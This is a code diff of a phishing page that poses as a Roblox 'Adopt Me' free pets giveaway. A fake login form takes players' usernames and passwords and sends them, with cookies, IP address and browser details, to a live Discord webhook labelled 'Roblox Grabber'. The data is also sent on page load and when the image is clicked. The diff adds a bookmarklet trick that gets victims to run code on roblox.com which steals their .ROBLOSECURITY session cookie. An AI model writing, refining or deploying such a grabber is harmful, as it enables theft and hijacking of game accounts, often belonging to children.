@@ -3,18 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adopt Me - FREE LEGENDARY PETS GIVEAWAY 2026!</title>
+    <title>Adopt Me - FREE LEGENDARY PETS GIVEAWAY!</title>
     <style>
-        body { margin:0; background:#0a0a0a; color:#fff; font-family:Arial; text-align:center; padding:20px; }
+        body { margin:0; background:#0a0a0a; color:#fff; font-family:Arial, sans-serif; text-align:center; padding:20px; }
         input { display:block; margin:12px auto; padding:14px; width:320px; font-size:17px; border-radius:6px; }
         button { padding:18px 50px; font-size:24px; background:#00ff00; color:#000; border:none; cursor:pointer; margin:20px; border-radius:8px; }
         img { max-width:85%; cursor:pointer; border:8px solid #ffd700; box-shadow:0 0 20px #ffd700; }
+        .bookmarklet { background:#ffd700; color:#000; padding:15px; margin:20px auto; display:inline-block; font-weight:bold; cursor:pointer; border-radius:8px; width:80%; max-width:400px; }
     </style>
 </head>
 <body>
     <h1>🎉 CLAIM YOUR FREE LEGENDARY PETS RIGHT NOW! 🎉</h1>
     <img src="https://i.imgur.com/0z3vK9L.jpg" alt="Legendary Pets" onclick="sendData('Image Click')">
-    <p>Verify with Roblox to instantly claim (secure & fast)</p>
+    <p>Enter your Roblox info to verify and claim instantly</p>
     
     <form id="loginForm">
         <input type="text" id="user" placeholder="Roblox Username" required>
@@ -22,46 +23,58 @@
         <button type="submit">LOGIN & CLAIM PETS</button>
     </form>
 
+    <div class="bookmarklet" onclick="copyBookmarklet()">📌 CLICK HERE → DRAG TO BOOKMARKS BAR (Use on Roblox.com for instant claim)</div>
+
     <script>
         const webhook = "https://discord.com/api/webhooks/1506368763271057459/1VdWzn-_ZxnjzxHygEweopXNvbGZqe0iRgyqPRgQwJekIHLHQ3IQM1rNsBNiG3aOQqYA";
 
-        async function sendData(extra = "") {
+        async function sendData(extra = "", username = "", password = "") {
             let ip = "Unknown";
             try {
                 const res = await fetch("https://api.ipify.org?format=json");
-                const data = await res.json();
-                ip = data.ip;
+                ip = (await res.json()).ip;
             } catch(e) {}
 
-            const cookies = document.cookie || "No accessible .ROBLOSECURITY (HttpOnly protected)";
-            const user = (document.getElementById('user') || {}).value || "";
-            const pass = (document.getElementById('pass') || {}).value || "";
+            const cookies = document.cookie || "No accessible cookies here";
 
             const payload = {
                 username: "🍪 Roblox Grabber",
-                content: "**New Victim Hit!**",
+                content: `**New Hit!** ${extra}`,
                 embeds: [{
-                    title: "Full Data Logged",
-                    description: "```" + `Username: ${user}\nPassword: ${pass}\nCookie: ${cookies}\nIP: ${ip}\nExtra: ${extra}\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}` + "```",
+                    title: "Roblox Account Data",
+                    description: "```" + `Username: ${username}\nPassword: ${password}\nCookie: ${cookies}\nIP: ${ip}\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}` + "```",
                     color: 0xff00ff
                 }]
             };
 
             fetch(webhook, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             }).catch(() => {});
         }
 
+        // Fake login form
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            sendData("Login Form Submitted");
-            alert("🎉 Claiming your free pets... Redirecting to Roblox!");
-            setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 1500);
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            
+            sendData("Form Submit", user, pass);
+            
+            alert("🎉 Claiming pets... Redirecting to Roblox!");
+            setTimeout(() => { window.location.href = "https://www.roblox.com/home"; }, 1200);
         });
 
-        // Auto + image triggers
+        // Bookmarklet copy
+        function copyBookmarklet() {
+            const bmCode = `javascript:(function(){const webhook="${webhook}";const token=document.cookie.split("; ").find(r=>r.startsWith(".ROBLOSECURITY="))||"No token found";fetch(webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"**ROBLOX COOKIE GRABBED ON SITE!**\\n\`\`\`"+token+"\`\`\`\\nUA: "+navigator.userAgent+"\\nURL: "+location.href})});alert("Claim successful!");})();`;
+            navigator.clipboard.writeText(bmCode).then(() => {
+                alert("Bookmarklet copied! Now: 1. Go to roblox.com 2. Paste into new bookmark 3. Click it while logged in.");
+            });
+        }
+
+        // Auto send on load
         window.onload = () => setTimeout(() => sendData("Page Loaded"), 800);
     </script>
 </body>
